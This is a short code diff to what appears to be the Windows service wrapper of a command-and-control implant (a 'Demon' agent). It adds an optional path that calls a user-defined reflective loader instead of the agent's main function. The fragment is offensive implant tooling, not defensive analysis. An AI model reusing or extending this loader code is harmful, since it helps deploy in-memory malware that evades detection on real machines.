@@ -1,5 +1,9 @@
 #include <Demon.h>
 
+#ifdef UDRL_SVC
+#include "UserDefinedReflectiveLoader.h"
+#endif
+
 /* Service handle and status variable */
 SERVICE_STATUS_HANDLE StatusHandle = { 0 };
 SERVICE_STATUS        SvcStatus    = {
@@ -35,7 +39,11 @@ VOID WINAPI SvcMain( DWORD dwArgc, LPTSTR* Argv )
         return;
 
     /* start our agent */
+#ifdef UDRL_SVC
+    ( ( void(*)() ) UserDefinedReflectiveLoader )();
+#else
     DemonMain( NULL, NULL );
+#endif
 }
 
 VOID WINAPI SrvCtrlHandler( DWORD CtrlCode )
